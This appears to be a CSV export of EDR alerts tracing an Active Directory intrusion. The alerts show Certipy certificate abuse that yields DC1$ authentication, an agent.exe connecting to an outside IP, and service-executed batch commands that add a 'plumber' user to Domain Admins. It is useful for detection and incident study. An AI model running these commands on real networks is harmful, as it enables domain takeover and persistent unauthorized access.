"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T10:46:41.199Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group 'Domain Admins' ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\GBYINygN.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\GBYINygN.bat & del C:\Windows\GBYINygN.bat","@{filename=GBYINygN.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158801}",
"2025-03-28T10:46:30.308Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\YYIRZuyG.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\YYIRZuyG.bat & del C:\Windows\YYIRZuyG.bat","@{filename=YYIRZuyG.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158790}",
"2025-03-28T10:46:26.621Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\hPNHAmXI.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\hPNHAmXI.bat & del C:\Windows\hPNHAmXI.bat","@{filename=hPNHAmXI.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158786}",
"2025-03-28T10:46:26.621Z","10.0.1.11","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\hPNHAmXI.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\hPNHAmXI.bat & del C:\Windows\hPNHAmXI.bat","@{filename=hPNHAmXI.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158786}",
"2025-03-28T10:46:20.777Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group 'Domain Adminis' plumber /domain /add ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\YXrvlwex.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\YXrvlwex.bat & del C:\Windows\YXrvlwex.bat","@{filename=YXrvlwex.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158780}",
"2025-03-28T10:46:13.168Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group 'Domain Administrators' plumber /domain /add ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\RAtkOqYr.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\RAtkOqYr.bat & del C:\Windows\RAtkOqYr.bat","@{filename=RAtkOqYr.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158773}",
"2025-03-28T10:46:00.613Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net domaingroup 'Domain Administrators' plumber /add ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\mYGGzlyS.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\mYGGzlyS.bat & del C:\Windows\mYGGzlyS.bat","@{filename=mYGGzlyS.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158760}",
"2025-03-28T10:45:43.682Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net user plumber P@assw0rd /add ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\CDzhEkex.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\CDzhEkex.bat & del C:\Windows\CDzhEkex.bat","@{filename=CDzhEkex.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158743}",
"2025-03-28T10:45:32.823Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo dir ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\UHYVLwxq.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\UHYVLwxq.bat & del C:\Windows\UHYVLwxq.bat","@{filename=UHYVLwxq.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158732}",
"2025-03-28T10:45:30.822Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\RGDfYeQB.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\RGDfYeQB.bat & del C:\Windows\RGDfYeQB.bat","@{filename=RGDfYeQB.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158730}",
"2025-03-28T10:45:30.822Z","10.0.1.11","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\RGDfYeQB.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\RGDfYeQB.bat & del C:\Windows\RGDfYeQB.bat","@{filename=RGDfYeQB.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158730}",
"2025-03-28T10:45:25.651Z","10.0.1.11","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\kjpsompf.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\kjpsompf.bat & del C:\Windows\kjpsompf.bat","@{filename=kjpsompf.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158725}",
"2025-03-28T10:45:25.651Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\kjpsompf.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\kjpsompf.bat & del C:\Windows\kjpsompf.bat","@{filename=kjpsompf.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158725}",
"2025-03-28T10:45:21.072Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo dir ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\WlUaNGHz.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\WlUaNGHz.bat & del C:\Windows\WlUaNGHz.bat","@{filename=WlUaNGHz.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158721}",
"2025-03-28T10:45:18.65Z","10.0.1.11","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\bMHsCQLF.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\bMHsCQLF.bat & del C:\Windows\bMHsCQLF.bat","@{filename=bMHsCQLF.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158718}",
"2025-03-28T10:45:18.65Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\bMHsCQLF.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\bMHsCQLF.bat & del C:\Windows\bMHsCQLF.bat","@{filename=bMHsCQLF.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158718}",
"2025-03-28T10:45:18.144Z","10.0.1.11","High","70","A process modified the registry in a way that may affect the security of the system. These modifications can be used by attackers to disable security controls and evade detection. Investigate the registry operations and process tree.","C:\Windows\system32\services.exe","",
"2025-03-28T10:43:58.866Z","10.0.1.29","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\alice\agent.exe"" -connect 116.203.101.164:5123 -ignore-cert","",
"2025-03-28T10:43:09.737Z","10.0.1.29","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\alice\agent.exe"" -connect 116.203.101.164:5123 -ignore-cert","",
"2025-03-28T10:42:20.204Z","10.0.1.29","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\alice\agent.exe"" -connect 116.203.101.164:5123 -ignore-cert","",
"2025-03-28T10:40:07.478Z","10.0.1.29","Informational","10","This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.","""C:\Users\alice\agent.exe"" -connect 116.203.101.164:5123 -ignore-cert","",
"2025-03-28T10:38:04.29Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" auth -pfx .\unprotected_pfx.pfx -username DC1$ -domain PLUMETECH.LOCAL","@{filename=api-ms-win-core-timezone-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158285},@{filename=api-ms-win-core-file-l2-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158285},@{filename=api-ms-win-core-errorhandling-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158285},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158286},@{filename=libssl-1_1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158286},@{filename=api-ms-win-core-processthreads-l1-1-1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158285},@{filename=api-ms-win-core-handle-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158285},@{filename=api-ms-win-crt-runtime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158285},@{filename=api-ms-win-core-synch-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158285},@{filename=api-ms-win-core-memory-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI106202; timestamp=1743158285}",
"2025-03-28T10:37:10.039Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" cert -export -pfx sbLtNH0U.pfx -password REDACTED -out unprotected_pfx.pfx","@{filename=api-ms-win-crt-environment-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231},@{filename=api-ms-win-core-timezone-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231},@{filename=api-ms-win-crt-conio-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231},@{filename=python310.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158232},@{filename=libffi-7.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231},@{filename=api-ms-win-core-localization-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231},@{filename=api-ms-win-core-handle-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231},@{filename=api-ms-win-core-processthreads-l1-1-1.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231},@{filename=api-ms-win-core-util-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231},@{filename=api-ms-win-core-file-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\_MEI33962; timestamp=1743158231}",
"2025-03-28T10:36:05.546Z","10.0.1.29","High","70","A process launched with a command line associated with known malware. Investigate the process tree.","""C:\Users\alice\Downloads\bin\bin\Certipy.exe"" req -username alice -password REDACTED -ca PLUMETECH-DC1-CA -target 10.0.1.11 -template KerberosAuthentication -upn jack@plumetech.local -dns 10.0.1.11","@{filename=api-ms-win-core-handle-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=api-ms-win-crt-utility-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=tk86t.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=api-ms-win-crt-process-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=api-ms-win-crt-runtime-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=api-ms-win-core-localization-l1-2-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=api-ms-win-core-console-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=api-ms-win-core-interlocked-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=api-ms-win-core-fibers-l1-1-0.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165},@{filename=ucrtbase.dll; filepath=\Device\HarddiskVolume1\Users\alice\AppData\Local\Temp\2\_MEI80762; timestamp=1743158165}",
